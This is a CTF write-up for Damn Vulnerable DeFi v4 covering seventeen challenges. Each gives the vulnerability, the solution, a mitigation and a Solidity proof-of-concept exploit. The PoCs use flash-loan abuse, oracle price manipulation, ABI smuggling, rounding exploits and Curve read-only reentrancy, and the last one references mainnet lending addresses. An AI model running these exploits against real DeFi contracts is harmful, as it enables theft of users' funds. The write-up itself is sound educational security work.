# Damn Vulnerable DeFi v4 Writeup
by tinamints

## 1. Unstoppable
### conditions :
-  halt the vault
### concepts :
-  flashloan
-  DOS
### solution : 
- send token via 'transfer' function to make `if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();` true because ERC4626 'totalSupply' only changes when someone send token via 'deposit function 
### mitigation :
- Don't tie a hard invariant to `token.balanceOf`; ERC4626 accounting should track shares/assets internally so a direct `transfer` can't break `flashLoan`. Remove the `convertToShares(totalSupply) != balanceBefore` check
### POC
` function test_unstoppable() public checkSolvedByPlayer {
        token.transfer(address(vault), 1);
    }
`

## 2. Naive receiver
### conditions :
- rescue all funds in the flashloan pool
- complete the challenge in less than 2 transactions
### concepts :
-  flashloan
### solution : 
- set the reciever as the tarket to pay fee and imposonate the feeReceiver to withdraw the accumulated WETH 
### mitigation :
- Authenticate the real loan initiator (don't let a receiver be billed for a loan it didn't request) and don't trust a forwarder's `_msgSender()` for `withdraw` — use proper access control / verify the trusted forwarder
### POC
` function test_naiveReceiver() public checkSolvedByPlayer {
    
        bytes[] memory data = new bytes[](10);
        for (uint256 i = 0; i < 10; i++) {
            data[i] = abi.encodeWithSignature(
                "flashLoan(address,address,uint256,bytes)",
                address(receiver), 
                address(weth),
                0, 
                ""
            );
        }
       
        pool.multicall(data);

        
        vm.startPrank(address(deployer));
        pool.withdraw(weth.balanceOf(address(pool)), payable(recovery));
        vm.stopPrank();
       
    }`

## 3. Truster
### conditions :
- rescue all funds to the recovery
- complete the challenge with 1 transaction
### concepts :
-  flashloan
-  unchecked argument
### solution : 
- set 'target'=pool and call 'approve' on it to approve the attacker on its token
### mitigation :
- Never let the pool make an arbitrary `target.call(data)` with its own authority; drop the user-supplied call, or whitelist the target/selector so it can't call the token's `approve`
### POC
`function test_truster() public checkSolvedByPlayer {
        Attacker attacker = new Attacker(pool, recovery, token, TOKENS_IN_POOL);
        attacker.attack();

    }`

## 4. Side Entrance
### conditions :
- rescue all funds and transfer to then recovery account with 1 ETH
### concepts :
-  flashloan with collateral
### solution :
- take an advantage of  `execute` being called during the flashloan  to deposit to the pool and get `balance` and get the right to call `withdraw`
### mitigation :
- Verify repayment by the pool's actual token-balance increase (with a reentrancy guard), not by letting a `deposit` during the loan count as paying it back
### POC
` function test_sideEntrance() public checkSolvedByPlayer {
        SideEntranceExploit exploit = new SideEntranceExploit(pool, recovery);

        exploit.exploit();

    }

`

## 5. The Rewarder
### conditions :
- save as much funds as possible and transfer to the recovery account
- have to be in the beneficiaries to interact with the distributor
### concepts :
-  restricted distribution 
-  merkle tree system
### solution :
- take the advantage of the fact that the distributor doesn't check `claimRewards()` when claim the same token and claim the same token multiple times
### mitigation :
- Mark each claim as used (set its claimed bit) before/within the loop and reject duplicate (token,batch) claims, so the same reward can't be claimed repeatedly in one call
### POC
` function test_theRewarder() public checkSolvedByPlayer {
        
        string memory dvtJson = vm.readFile(
            "test/the-rewarder/dvt-distribution.json"
        );
        Reward[] memory dvtRewards = abi.decode(
            vm.parseJson(dvtJson),
            (Reward[])
        );
        
        string memory wethJson = vm.readFile(
            "test/the-rewarder/weth-distribution.json"
        );
        Reward[] memory wethRewards = abi.decode(
            vm.parseJson(wethJson),
            (Reward[])
        );
        
        bytes32[] memory dvtLeaves = _loadRewards(
            "/test/the-rewarder/dvt-distribution.json"
        );
        bytes32[] memory wethLeaves = _loadRewards(
            "/test/the-rewarder/weth-distribution.json"
        );

        
        uint256 playerDvtAmount;
        bytes32[] memory playerDvtProof;
        uint256 playerWethAmount;
        bytes32[] memory playerWethProof;
        
        for (uint i = 0; i < dvtRewards.length; i++) {
            if (dvtRewards[i].beneficiary == player) {
                playerDvtAmount = dvtRewards[i].amount;
                playerWethAmount = wethRewards[i].amount;
                playerDvtProof = merkle.getProof(dvtLeaves, i);
                playerWethProof = merkle.getProof(wethLeaves, i);
                break;
            }
        }
        require(playerDvtAmount > 0, "Player not found in DVT distribution");
        require(playerWethAmount > 0, "Player not found in WETH distribution");

        
        IERC20[] memory tokensToClaim = new IERC20[](2);
        tokensToClaim[0] = IERC20(address(dvt));
        tokensToClaim[1] = IERC20(address(weth));

        
        uint256 totalClaimsNeeded = (TOTAL_DVT_DISTRIBUTION_AMOUNT /
            playerDvtAmount) +
            (TOTAL_WETH_DISTRIBUTION_AMOUNT / playerWethAmount);
        uint256 dvtClaims = TOTAL_DVT_DISTRIBUTION_AMOUNT / playerDvtAmount;
        Claim[] memory claims = new Claim[](totalClaimsNeeded);

        
        for (uint256 i = 0; i < totalClaimsNeeded; i++) {
            claims[i] = Claim({
                batchNumber: 0,
                amount: i < dvtClaims ? playerDvtAmount : playerWethAmount,
                tokenIndex: i < dvtClaims ? 0 : 1,
                proof: i < dvtClaims ? playerDvtProof : playerWethProof
            });
        }

        distributor.claimRewards({
            inputClaims: claims,
            inputTokens: tokensToClaim
        });

        dvt.transfer(recovery, dvt.balanceOf(player));
        weth.transfer(recovery, weth.balanceOf(player));

    }`

## 6. Selfie
### conditions :
- drain all tokens from the pool to recovery
### concepts :
-  flashloan
-  governance voting power
### solution :
- flashloan the pool tokens to temporarily gain majority voting power, queue `emergencyExit` as a governance action, repay the loan, wait 2 days, execute the action
### mitigation :
- Base voting power on checkpointed/time-weighted balances held before the proposal, so a flash-loaned balance in a single block can't reach quorum
### POC
` function test_selfie() public checkSolvedByPlayer {
        pool.flashLoan(this, address(token), TOKENS_IN_POOL, "");
        vm.warp(block.timestamp + 2 days);
        governance.executeAction(1);
    }
`

## 7. Compromised
### conditions :
- drain all ETH from exchange to recovery
- player must not own any NFT
- NFT price must remain unchanged
### concepts :
-  oracle price manipulation
-  leaked private keys
### solution :
- decode leaked private keys (from README hex strings) of 2 oracle sources, set NFT price to 0, buy for 1 wei, restore price to 999 ETH, sell NFT, send ETH to recovery
### mitigation :
- Keep oracle signer keys secret and aggregate many independent sources with deviation checks (e.g. Chainlink), so leaking/controlling a couple of sources can't set the price
### POC
` function test_compromised() public checkSolved {
        vm.prank(source1); oracle.postPrice("DVNFT", 0);
        vm.prank(source2); oracle.postPrice("DVNFT", 0);
        vm.startPrank(player);
        uint256 nftId = exchange.buyOne{value: 1 wei}();
        nft.approve(address(exchange), nftId);
        vm.stopPrank();
        vm.prank(source1); oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.prank(source2); oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.startPrank(player);
        exchange.sellOne(nftId);
        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }
`

## 8. Puppet
### conditions :
- drain all 100k DVT from lending pool to recovery
- complete in 1 transaction
### concepts :
-  Uniswap V1 oracle price manipulation
-  EIP-2612 permit
### solution :
- dump player's 1000 DVT into Uniswap V1 to crash the token price, making `calculateDepositRequired` near zero, then borrow all pool tokens in 1 tx using permit for token approval
### mitigation :
- Read the price from a manipulation-resistant oracle (TWAP / Chainlink), not instantaneous Uniswap V1 spot reserves
### POC
` function test_puppet() public checkSolvedByPlayer {
        PuppetPoolAttacker attacker = new PuppetPoolAttacker(
            address(token), address(lendingPool), address(uniswapV1Exchange), recovery
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPrivateKey, digest);
        attacker.attack{ value: 25 ether }(player, deadline, v, r, s);
    }
`

## 9. Puppet V2
### conditions :
- drain all 1M DVT from lending pool to recovery
### concepts :
-  Uniswap V2 oracle price manipulation
-  WETH collateral
### solution :
- sell all 10k player tokens into Uniswap V2 to crash DVT price, then borrow 1M pool tokens with the now-minimal WETH collateral required
### mitigation :
- Same as Puppet: value collateral with a TWAP/external oracle instead of the Uniswap V2 `getReserves` spot price
### POC
` function test_puppetV2() public checkSolvedByPlayer {
        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
        uniswapV2Router.swapExactTokensForETH(tokensToSell, 0, path, player, block.timestamp + 1);
        uint256 requiredWETH = lendingPool.calculateDepositOfWETHRequired(poolTokens);
        weth.deposit{value: ethBalance}();
        weth.approve(address(lendingPool), requiredWETH);
        lendingPool.borrow(poolTokens);
        token.transfer(recovery, token.balanceOf(player));
    }
`

## 10. Free rider
### conditions :
- drain all 6 NFTs from marketplace
- player earns the bounty (45 ETH)
### concepts :
-  Uniswap V2 flashloan
-  NFT marketplace buy logic bug
### solution :
- flashloan 15 ETH (price of 1 NFT). marketplace bug: only checks `msg.value >= price` once but allows buying all 6, and sends ETH to the buyer instead of the seller. buy all 6 for 15 ETH, transfer to recoveryManager to claim 45 ETH bounty
### mitigation :
- Charge the sum of each NFT's price (validate payment per item) and send proceeds to the seller (the owner before transfer), following checks-effects-interactions
### POC
` function test_freeRider() public checkSolvedByPlayer {
        flashLoanUser attacker = new flashLoanUser(
            address(marketplace), address(recoveryManager), address(nft),
            address(uniswapPair), address(token), address(weth), address(player)
        );
        attacker.flashLoanInitilizer(15 ether);
    }
`

## 11. Backdoor
### conditions :
- drain all 40 DVT to recovery
- complete in 1 transaction
### concepts :
-  Safe proxy factory
-  arbitrary call injection during setup
### solution :
- use `createProxyWithCallback`'s `initializer` field to inject an `approve` call during Safe's `setup()`. WalletRegistry sends 10 DVT to the new wallet, attacker immediately `transferFrom` the tokens. repeat for all 4 users
### mitigation :
- Have the registry validate the new wallet's setup (expected owners, no modules/delegatecall/injected calls) before paying, instead of trusting arbitrary `initializer` calldata
### POC
` function test_backdoor() public checkSolvedByPlayer {
        new Attacker(
            address(walletFactory), address(singletonCopy),
            address(walletRegistry), address(token), recovery, users
        );
    }
`

## 12. Climber
### conditions :
- drain all 10M DVT from vault to recovery
### concepts :
-  timelock execute-before-schedule bug
-  UUPS proxy upgrade
### solution :
- `execute()` runs actions before checking if they're scheduled. execute a batch: set delay to 0, grant proposer role to attacker, upgrade vault to malicious impl, retroactively `schedule` the batch from inside the callback. then call `sweepFunds` on the upgraded vault
### mitigation :
- Check the operation is scheduled and ready BEFORE executing it (and mark it executed before the external calls) — enforce schedule-then-execute ordering
### POC
` function test_climber() public checkSolvedByPlayer {
        MaliciousVaultImpl maliciousImpl = new MaliciousVaultImpl();
        ClimberAttack attackContract = new ClimberAttack(
            payable(address(vault)), payable(address(timelock)), recovery, address(token)
        );
        attackContract.attack(address(maliciousImpl));
    }
`

## 13. Wallet mining
### conditions :
- recover all 20M DVT from the user's deposit address back to the user, and pay the wallet deployer's reward to the ward
- allowed only 1 tx
### concepts :
-  upgradeable proxy storage-slot collision (reinitialization)
-  CREATE2 address mining
### solution :
- `AuthorizerUpgradeable`'s `needsInit` lives in storage slot 0, which collides with the proxy's `upgrader` address (always non-zero) — so `init()` can be replayed by anyone to self-authorize. `WalletDeployer.drop()` only checks that a chosen `(wat, nonce)` pair CREATE2-deploys to `USER_DEPOSIT_ADDRESS`, so brute-force the nonce until it matches, deploy the real Safe there (owned by `user`), drain it with the user's signature via `execTransaction`, and forward the deployer's reward to `ward`.
### mitigation :
- Store the init flag in a dedicated, non-colliding slot (OZ `Initializable`) so `init()` can't be replayed, and don't fund a counterfactual address before verifying the deployed wallet's owner
### POC
`   {
     // 1. Get authorized
        getAuthorized(authorizer);

        // 2. Find the nonce
        bytes memory setupCalldata = _buildSetup(user);
        uint256 nonce = findNonce(walletDeployer, setupCalldata);

        // 3. Call drop() — deploys the Safe at USER_DEPOSIT_ADDRESS with `user` as owner,
        //    and pays 1 DVT to this contract (msg.sender)
        WalletDeployer(walletDeployer).drop(USER_DEPOSIT_ADDRESS, setupCalldata, nonce);

        // 4. Drain the Safe
        _drainSafe(token, user, userPrivateKey);

        // 5. Forward the reward
        IERC20(token).transfer(ward, IERC20(token).balanceOf(address(this)));
    }

    // 1. Slot 0 collision: needsInit reads the proxy's upgrader address (non-zero), so init()'s require passes again
    function getAuthorized(address authorizer) internal {
        address[] memory wards = new address[](1);
        wards[0] = address(this);
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;
        AuthorizerUpgradeable(authorizer).init(wards, aims);
    }

    function _buildSetup(address user) internal pure returns (bytes memory) {
        address[] memory owners = new address[](1);
        owners[0] = user;
        return abi.encodeCall(
            Safe.setup, (owners, 1, address(0), bytes(""), address(0), address(0), 0, payable(address(0)))
        );
    }

    // 2. Brute-force nonces until SafeProxyFactory.createProxyWithNonce() would deploy to USER_DEPOSIT_ADDRESS
    function findNonce(address walletDeployer, bytes memory setupCalldata) internal view returns (uint256) {
        WalletDeployer wd = WalletDeployer(walletDeployer);
        bytes32 initCodeHash = keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(wd.cpy()))));
        bytes32 initializerHash = keccak256(setupCalldata);
        address factory = address(wd.cook());
        for (uint256 n = 0; n < 1000; n++) {
            address predicted = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), factory, keccak256(abi.encodePacked(initializerHash, n))
            , initCodeHash)))));        
                
            if (predicted == USER_DEPOSIT_ADDRESS) {
                console.log("found nonce:", n);
                return n;
            }
        }
        revert("nonce not found in 0..999");
    }

    function _drainSafe(address token, address user, uint256 userPrivateKey) internal {
        Safe safe = Safe(payable(USER_DEPOSIT_ADDRESS));
        bytes memory transferCalldata = abi.encodeCall(
            IERC20.transfer, (user, IERC20(token).balanceOf(USER_DEPOSIT_ADDRESS))
        );
        bytes32 txHash = safe.getTransactionHash(
            token, 0, transferCalldata, Enum.Operation.Call, 0, 0, 0, address(0), address(0), 0
        );
        (uint8 v, bytes32 r, bytes32 s) = hevm.sign(userPrivateKey, txHash);
        safe.execTransaction(
            token, 0, transferCalldata, Enum.Operation.Call, 0, 0, 0, address(0), payable(address(0)),
            abi.encodePacked(r, s, v)
        );
    }
`

## 14. Puppet V3
### conditions :
- drain all 1M DVT from the lending pool to recovery
- complete within the challenge's time limit (under 115 seconds after setup)
### concepts :
-  Uniswap V3 TWAP oracle price manipulation
-  time-weighted average price (delaying the manipulation with `vm.warp`)
### solution :
- dump the player's 110 DVT into the Uniswap V3 pool via `exactInputSingle` to crash the token price, then `vm.warp` forward as close to the time limit as possible so the TWAP shifts toward the crashed price, making `calculateDepositOfWETHRequired` cheap enough to borrow all 1M DVT with minimal WETH collateral
### mitigation :
- Use a longer TWAP window (and/or a second oracle) so a short, single-block price push can't move the average enough to cheat the collateral quote
### POC
` function test_puppetV3() public checkSolvedByPlayer {
        address uniswapRouterAddress = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
        token.approve(address(uniswapRouterAddress), type(uint256).max);
        uint256 quote1 = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
        console.log("quote1: ", quote1);
 
        ISwapRouter(uniswapRouterAddress).exactInputSingle(
            ISwapRouter.ExactInputSingleParams(
                address(token),
                address(weth),
                3000,
                address(player),
                block.timestamp,
                PLAYER_INITIAL_TOKEN_BALANCE,
                0,
                0
            )
        );  
         vm.warp(block.timestamp + 114);
        uint256 quote = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
        weth.approve(address(lendingPool), quote);
        console.log("quote: ", quote);
        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
        token.transfer(recovery,LENDING_POOL_INITIAL_TOKEN_BALANCE);
        
    }
`

## 15. ABI Smuggling
### conditions :
- rescue all 1M DVT from the vault to recovery
### concepts :
-  ABI smuggling
-  calldata offset manipulation
### solution :
- `execute()` only checks permissions using the selector read from a hardcoded calldata offset (byte 100), not the real `actionData` offset. Craft calldata where the decoy `withdraw` selector sits at byte 100 (which the player IS permitted to call) while the offset field actually points further along to the real payload — a `sweepFunds` call (which the player is NOT permitted to call) — so the permission check passes on the decoy but the vault executes the smuggled action instead
### mitigation :
- Decode `actionData` exactly as it will be executed and check the selector of that real payload — never read the permission selector from a hardcoded calldata offset
### POC
` function test_abiSmuggling() public checkSolvedByPlayer {
         Exploit exploit = new Exploit(address(vault),address(token),recovery);
        bytes memory payload = exploit.executeExploit();
        address(vault).call(payload);
    }`

`contract Exploit {
    function executeExploit() external returns (bytes memory) {
        bytes4 executeSelector = vault.execute.selector;
        bytes memory target = abi.encodePacked(bytes12(0), address(vault));
        bytes memory dataOffset = abi.encodePacked(uint256(0x80));
        bytes memory emptyData = abi.encodePacked(uint256(0));
        bytes memory withdrawSelectorPadded = abi.encodePacked(
            bytes4(0xd9caed12),
            bytes28(0)
        );
        bytes memory sweepFundsCalldata = abi.encodeWithSelector(
            vault.sweepFunds.selector,
            recovery,
            token
        );
        uint256 actionDataLengthValue = sweepFundsCalldata.length;
        bytes memory actionDataLength = abi.encodePacked(uint256(actionDataLengthValue));

        bytes memory calldataPayload = abi.encodePacked(
            executeSelector,
            target,
            dataOffset,
            emptyData,
            withdrawSelectorPadded,
            actionDataLength,
            sweepFundsCalldata
        );

        return calldataPayload;
    }
}`



## 16. Shards
### conditions :
- take DVT out of the marketplace and send all of it to recovery
- staking contract balance must not change
- player can only send a single transaction
### concepts :
-  rounding errors (round down vs round up)
-  mismatched pay/refund formulas
-  broken time check
### solution :
- `fill()` charges `want * _toDVT(price, rate) / totalShards` rounded down, so buying 100 shards costs 0 DVT (100 * 75e21 / 1e25 = 0.75 → 0). `cancel()` refunds with a different formula, `shards * rate / 1e6` rounded up, which pays back ~7.5e12 DVT wei for the same 100 shards. `cancel()`'s time check is also written backwards, so you can cancel in the same block as the purchase. Loop fill → cancel 10001 times inside one exploit contract (to keep it to one transaction) and send the profit to recovery
### mitigation :
- Use consistent rounding that always favors the protocol (round the charge up, refund down), reject zero-cost fills, and fix the reversed time-window comparison in `cancel()`
### POC
` function test_shards() public checkSolvedByPlayer {
         Exploit exploit = new Exploit(marketplace,token,recovery);
        exploit.attack(1);
    }`

`contract Exploit {
    function attack(uint64 offerId) external {
        uint256 wantShards = 100;
        for (uint256 i = 0; i < 10001; i++) {
            marketplace.fill(offerId, wantShards);
            marketplace.cancel(1,i);
        }
        token.transfer(recovery,token.balanceOf(address(this)));
    }
}`



## 17. Curvy Puppet
### conditions :
- close all 3 users' positions (alice/bob/charlie) in the lending contract (collateral + borrow both 0)
- treasury must keep some WETH and some LP, and end with all 3 users' DVT (7500)
- player must end with nothing
### concepts :
-  read-only reentrancy (Curve `get_virtual_price()`)
-  price-oracle manipulation of a borrow asset
-  nested flash loans (Balancer + Aave)
### solution :
- The lending contract prices its borrow asset (Curve stETH/ETH LP token) as `ETH_price * get_virtual_price()`. The old Curve pool's `remove_liquidity` burns LP supply first, then raw-calls the caller with ETH **before** the pool balances settle, so `get_virtual_price()` reads an inflated value during that ETH callback (read-only reentrancy). Because the LP token is the users' *borrow* asset, an inflated LP price inflates everyone's debt value, flipping the 3 overcollateralized positions to liquidatable.
- Liquidation triggers when `collateralValue*100 < borrowValue*175`. With collateral = 2500 DVT @ $10 and borrow = 1 LP, this needs `virtual_price > 3.5714e18` (baseline is ~1.1e18). (in /CurvyPuppetLending.sol)
- Flow: flash-loan WETH+wstETH from Balancer (outer, 0 fee) and Aave (inner) → unwrap/withdraw into ETH+stETH → `add_liquidity` a huge, deliberately stETH-heavy deposit (the spike scales with the stETH side) → `remove_liquidity` → inside the ETH `receive()` the virtual_price is spiked, so `liquidate()` all 3 users (paying 1 LP each from the treasury's 6.5 LP, receiving 2500 DVT each).
- Repay: the ETH-poor deposit returns ETH-heavy / stETH-light, leaving an ETH surplus and a wstETH deficit of ~equal value; set aside the WETH owed, convert the remaining ETH to stETH via Lido (keeping a small reserve so the treasury keeps WETH), wrap to cover all wstETH owed. Aave's ~0.05% premium is the main cost, absorbed by the treasury's 200 WETH cushion, so the wstETH loan is kept modest.
### mitigation :
- Never read `get_virtual_price()` (or any pool state) while control can be handed to an untrusted caller — use a manipulation-resistant oracle, or guard views with the pool's reentrancy lock (Curve later added `remove_liquidity` reentrancy protection). Don't price a lending asset off a single spot virtual price.
### POC
` function test_curvyPuppet() public checkSolvedByPlayer {
        Exploit exploit = new Exploit(
            lending, curvePool, oracle, dvt, stETH, weth, treasury, [alice, bob, charlie]
        );
        weth.transferFrom(treasury, address(exploit), TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).transferFrom(treasury, address(exploit), TREASURY_LP_BALANCE);
        exploit.run();
    }`

`contract Exploit {
    IBalancerVault constant balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    address constant aavePool = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    IWstETH constant wstETH = IWstETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);

    // Balancer <= ~37,991 WETH / ~12,597 wstETH ; Aave <= ~83,192 WETH / ~1,036,780 wstETH
    uint256 constant BAL_WETH   = 37_000e18;
    uint256 constant BAL_WSTETH = 12_000e18;
    // stETH-heavy: sized to push virtual_price just past ~3.5714e18 (liquidation threshold)
    uint256 constant AAVE_WETH   = 83_000e18;
    uint256 constant AAVE_WSTETH = 140_000e18;
    uint256 constant ETH_RESERVE = 20e18; // ETH kept so treasury ends with WETH > 0

    // ... immutables + constructor storing lending/curvePool/oracle/dvt/stETH/weth/treasury/lpToken/users
    enum State { NONE, LIQUIDATING }
    State state;

    function run() external {
        // OUTER loan: Balancer (tokens sorted ascending: wstETH < WETH)
        address[] memory tokens = new address[](2);
        uint256[] memory amounts = new uint256[](2);
        tokens[0] = address(wstETH); tokens[1] = address(weth);
        amounts[0] = BAL_WSTETH;     amounts[1] = BAL_WETH;
        balancer.flashLoan(address(this), tokens, amounts, "");

        // everything ends up with the treasury
        weth.deposit{value: address(this).balance}();
        dvt.transfer(treasury, dvt.balanceOf(address(this)));            // 7500 DVT
        weth.transfer(treasury, weth.balanceOf(address(this)));          // WETH > 0
        IERC20(lpToken).transfer(treasury, IERC20(lpToken).balanceOf(address(this))); // LP > 0
    }

    function receiveFlashLoan(address[] memory, uint256[] memory, uint256[] memory, bytes memory) external {
        require(msg.sender == address(balancer), "not balancer");
        // INNER loan: Aave (both assets), [0,0] modes = repay in full
        address[] memory assets = new address[](2);
        uint256[] memory amts = new uint256[](2);
        uint256[] memory modes = new uint256[](2);
        assets[0] = address(weth);  assets[1] = address(wstETH);
        amts[0] = AAVE_WETH;        amts[1] = AAVE_WSTETH;
        (bool ok,) = aavePool.call(abi.encodeWithSignature(
            "flashLoan(address,address[],uint256[],uint256[],address,bytes,uint16)",
            address(this), assets, amts, modes, address(this), bytes(""), uint16(0)));
        require(ok, "aave flashloan failed");
        // repay Balancer (no fee)
        IERC20(address(weth)).transfer(address(balancer), BAL_WETH);
        IERC20(address(wstETH)).transfer(address(balancer), BAL_WSTETH);
    }

    function executeOperation(address[] calldata, uint256[] calldata, uint256[] calldata premiums,
        address initiator, bytes calldata) external returns (bool) {
        require(msg.sender == aavePool && initiator == address(this));
        // 1) all borrowed tokens -> pool coins (ETH + stETH)
        weth.withdraw(IERC20(address(weth)).balanceOf(address(this)));
        wstETH.unwrap(IERC20(address(wstETH)).balanceOf(address(this)));
        stETH.approve(address(curvePool), type(uint256).max);
        // 2) add huge (stETH-heavy) liquidity
        uint256 stEthAmount = stETH.balanceOf(address(this));
        uint256 ethForLp = address(this).balance;
        uint256 lpMinted = curvePool.add_liquidity{value: ethForLp}([ethForLp, stEthAmount], 0);
        // 3) let lending pull our LP during liquidate()
        IERC20(lpToken).approve(address(permit2), type(uint256).max);
        permit2.approve(lpToken, address(lending), type(uint160).max, uint48(block.timestamp + 1));
        // 4) remove -> pool raw-calls receive() with ETH -> liquidate window
        state = State.LIQUIDATING;
        curvePool.remove_liquidity(lpMinted, [uint256(0), uint256(0)]);
        state = State.NONE;
        // 5) repay: ETH surplus -> stETH -> wstETH to cover the wstETH deficit
        uint256 wethOwed   = AAVE_WETH + premiums[0] + BAL_WETH;
        uint256 wstethOwed = AAVE_WSTETH + premiums[1] + BAL_WSTETH;
        weth.deposit{value: wethOwed}();
        uint256 ethBal = address(this).balance;
        if (ethBal > ETH_RESERVE) {
            (bool ok,) = address(stETH).call{value: ethBal - ETH_RESERVE}(
                abi.encodeWithSignature("submit(address)", address(0)));
            require(ok, "lido submit failed");
        }
        stETH.approve(address(wstETH), type(uint256).max);
        wstETH.wrap(stETH.balanceOf(address(this)));
        require(IERC20(address(wstETH)).balanceOf(address(this)) >= wstethOwed, "wsteth short");
        IERC20(address(weth)).approve(aavePool, AAVE_WETH + premiums[0]);
        IERC20(address(wstETH)).approve(aavePool, AAVE_WSTETH + premiums[1]);
        return true;
    }

    receive() external payable {
        if (state != State.LIQUIDATING) return;
        // virtual_price is inflated now (read-only reentrancy) -> all positions liquidatable
        for (uint256 i = 0; i < users.length; i++) lending.liquidate(users[i]);
    }
}`
